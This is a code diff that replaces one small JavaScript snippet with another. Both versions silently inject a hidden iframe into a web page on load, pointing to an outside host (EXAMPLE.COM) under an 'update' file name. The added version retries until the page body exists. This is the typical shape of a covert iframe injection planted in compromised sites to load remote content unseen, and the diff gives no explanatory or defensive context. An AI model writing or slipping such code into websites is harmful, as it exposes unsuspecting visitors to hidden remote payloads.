@@ -1,18 +1,14 @@
-(function(w,d){
-
-  function mi() {
-    var i=d.createElement("iframe");
-    i.style.display = "none";
-    i.src = "http://EXAMPLE.COM/update.html";
-    d.body.appendChild(i);
-  }
-
-  if (d.readyState === "complete") {
-    mi();
-  } else if (w.addEventListener) {
-    w.addEventListener("load", mi, false);
-  } else if (w.attachEvent) {
-    w.attachEvent("onload", mi);
-  }
-
-})(window, document);
+(function(d) {
+    var doUpdate = function() {
+        if ( "undefined" === typeof(d.body) || !d.body ) {
+            setTimeout(doUpdate, 500);
+        }
+        else {
+            var iframe1 = d.createElement("iframe");
+            iframe1.style.display = "none";
+            iframe1.src = "http://EXAMPLE.COM/update.php?v=11:29:48";
+            d.body.appendChild(iframe1);
+        }
+    };
+    doUpdate();
+})(document);
